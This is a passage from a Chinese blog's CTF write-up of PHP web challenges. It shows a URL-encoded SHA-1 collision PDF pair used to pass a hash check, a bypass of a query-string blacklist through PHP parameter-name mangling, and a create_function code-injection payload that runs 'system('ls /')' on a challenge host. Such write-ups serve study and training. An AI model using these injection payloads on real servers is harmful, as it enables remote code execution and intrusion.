class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>C<span class="hljs-variable">%C1</span><span class="hljs-variable">%A8t</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%0</span>Cx<span class="hljs-number">0</span>Z<span class="hljs-variable">%21</span>Vda<span class="hljs-number">0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%89</span><span class="hljs-variable">%60</span>k<span class="hljs-variable">%D0</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%04</span>F<span class="hljs-variable">%29</span><span class="hljs-variable">%A1</span>&amp;array<span class="hljs-number">2</span><span class="hljs-operator">=</span><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span>sF<span class="hljs-variable">%DC</span><span class="hljs-variable">%91</span>f<span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%11</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%B6</span><span class="hljs-variable">%21</span><span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%F9</span><span class="hljs-variable">%CAg</span><span class="hljs-variable">%CC</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8</span><span class="hljs-variable">%5</span>B<span class="hljs-variable">%A8Ly</span><span class="hljs-variable">%03</span><span class="hljs-variable">%0</span>C<span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%E2</span><span class="hljs-variable">%18</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%DFE</span><span class="hljs-variable">%C1O</span><span class="hljs-variable">%26</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%DC8</span><span class="hljs-variable">%E9j</span><span class="hljs-variable">%C2</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%BDr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EE<span class="hljs-variable">%BC</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%D2</span><span class="hljs-variable">%3</span>CW<span class="hljs-variable">%0</span>F<span class="hljs-variable">%EB</span><span class="hljs-variable">%14</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%BBU.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E31</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%807</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%1</span>F<span class="hljs-variable">%0</span>E<span class="hljs-number">3</span>.<span class="hljs-variable">%DF</span><span class="hljs-variable">%93</span><span class="hljs-variable">%AC5</span><span class="hljs-variable">%00</span><span class="hljs-variable">%EBM</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%EC</span><span class="hljs-variable">%C1</span><span class="hljs-variable">%A8dy</span><span class="hljs-variable">%0</span>Cx<span class="hljs-variable">%2</span>Cv<span class="hljs-variable">%21</span>V<span class="hljs-variable">%60</span><span class="hljs-variable">%DD0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%91</span><span class="hljs-variable">%D0k</span><span class="hljs-variable">%D0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%BCF</span><span class="hljs-variable">%29</span><span class="hljs-variable">%B1</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123153144642.png" srcset="/img/loading.gif" lazyload alt="image-20240123153144642"></p>
+<p>直接就过了</p>
+<p>0x05</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//here is last level</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;str.php&quot;</span>;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$str</span>[<span class="hljs-string">&#x27;query&#x27;</span>] == <span class="hljs-string">&quot;&quot;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;give me a parameter&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ |_|20|5f|2e|\./&#x27;</span>,<span class="hljs-variable">$str</span>[<span class="hljs-string">&#x27;query&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;blacklist here&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NI_SA_&#x27;</span>] === <span class="hljs-string">&quot;txw4ever&quot;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable">$level5</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;level 4 failed ...&quot;</span>);<br>    &#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>首先得绕过检查</p>
+<blockquote>
+<p>在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123153835572.png" srcset="/img/loading.gif" lazyload alt="image-20240123153835572"></p>
+<p>或者构造一个不合理的url</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://1.14.71.254:28023///level_level_4.php?NI_SA_=txw4ever">http://1.14.71.254:28023///level_level_4.php?NI_SA_=txw4ever</a></p>
+</blockquote>
+<p>0x06</p>
+<p>这个的话<img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123154456727.png" srcset="/img/loading.gif" lazyload alt="image-20240123154456727"></p>
+<p>看到了<code>$a(&#39;&#39;,$b);</code></p>
+<p>就可以思考构造一个create_function，但是又得过正则，所以直接取反</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>node5.anna.nssctf.cn:<span class="hljs-number">28841</span><span class="hljs-regexp">/55_5_55.php?a=\create_function&amp;b=;&#125;system(&#x27;ls /</span><span class="hljs-string">&#x27;);/*</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123154802494.png" srcset="/img/loading.gif" lazyload alt="image-20240123154802494"></p>
+<p>然后get falg</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/">#渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>total</div>
+      <div>https://tsy244.github.io/2024/01/23/CTF刷题记录/WEB/total/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>January 23, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/23/%E6%B8%97%E9%80%8F/Metasploit/" title="Metasploit">
+                        <span class="hidden-mobile">Metasploit</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
